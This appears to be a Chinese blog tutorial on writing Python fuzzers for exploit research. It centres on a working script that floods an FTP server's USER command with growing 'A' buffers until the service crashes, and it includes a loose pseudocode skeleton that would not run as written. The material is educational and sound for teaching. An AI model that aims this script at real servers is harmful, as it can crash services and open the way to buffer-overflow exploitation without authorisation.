---
layout: post
title: Python黑客之旅0x4
category: Python
description: Python信息安全中的应用
keywords: Python, KaliLinux
---

* TOC 
{:toc}

## 编写Fuzz测试脚本

 这一章将会演示教你如何写一个属于自己的`Fuzz`测试脚本，当我们进行`exploit`研究和开发的时候就可以使用脚本语言发送大量的测试数据给受害者机器，但是这个错误数据很容易引发应用程序崩溃掉。

而`Python`却不同，当程序崩溃之后，此时你的程序会暂时断开连接，随后会立即创建一个新的连接继续执行。
 
 下面我们首先要解决的问题是应用程序如何处理用户输入的内容，因为在进行模糊测试的时候，我们会不定时的想到一些新的思路然后把数据发送给受害者机器上面来测试，这基本思路就是先与服务器建立连接,然后发送测试数据给服务器，通过`while`循环语句来判断是否成功，即使出现错误也会处理掉:
 




## 下面是我们的扫描器伪代码:
 
``` python
 #导入socket,sys模块，如果是web服务那么还需要导入httplib,urllib等模块
 <import modules> 

#设置ip/端口
#调用脚本: ./script.py <RHOST> <RPORT>
RHOST = sys.argv[1]
RPORT = sys.argv[2]
 
#定义你的测试数据,并且设置测试数据范围值
buffer = '\x41'*50
 
#使用循环来连接服务并且发送测试数据
while True:
  try:
    # 发送测试数据
    # 直到递增到50
    buffer = buffer + '\x41'*50
  except:
    print "Buffer Length: "+len(buffer)
    print "Can't connect to service...check debugger for potential crash"
```

上面这个脚本框架能够适用于各种服务，你可以根据你的服务(`https,http,mysql,sshd`)编写特定模糊测试脚本.下面我们演示一个基于`USER`命令的ftp服务器模糊测试脚本:

## 模糊测试脚本

``` python
#导入你将要使用的模块，这样你就不用去自己实现那些功能函数了
import sys, socket
from time import sleep
 
#声明第一个变量target用来接收从命令端输入的第一个值
target = sys.argv[1]
#创建50个A的字符串 '\x41'
buff = '\x41'*50
 
# 使用循环来递增至声明buff变量的长度50
while True:
  #使用"try - except"处理错误与动作
  try:
    # 连接这目标主机的ftp端口 21
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect((target,21))
    s.recv(1024)
 
    print "Sending buffer with length: "+str(len(buff))
    #发送字符串:USER并且带有测试的用户名
    s.send("USER "+buff+"\r\n")
    s.close()
    sleep(1)
    #使用循环来递增直至长度为50
    buff = buff + '\x41'*50
 
  except: # 如果连接服务器失败，我们就打印出下面的结果
    print "[+] Crash occured with buffer length: "+str(len(buff)-50)
    sys.exit()
```

> 上面这段代码演示了一个基本的Fuzz测试脚本，但是值得注意的是执行上面的代码，提交`\x41`字符可能不会让你成功的拿下受害主机，但是你可以尝试组合一些其他的字符(用户词典).此外还有一个更加强大的Fuzz测试工具[Spike](https://www.blackhat.com/presentations/bh-usa-02/bh-us-02-aitel-spike.ppt)和[具体介绍与演示](http://resources.infosecinstitute.com/intro-to-fuzzing/),它可以一次性的测试大量数据，并且能让你提高成功概率.

## 练习
大家可以把上面的`ftp`测试换成`http`测试，这里提示:你可能需要使用`httplib/urllib`.下一章
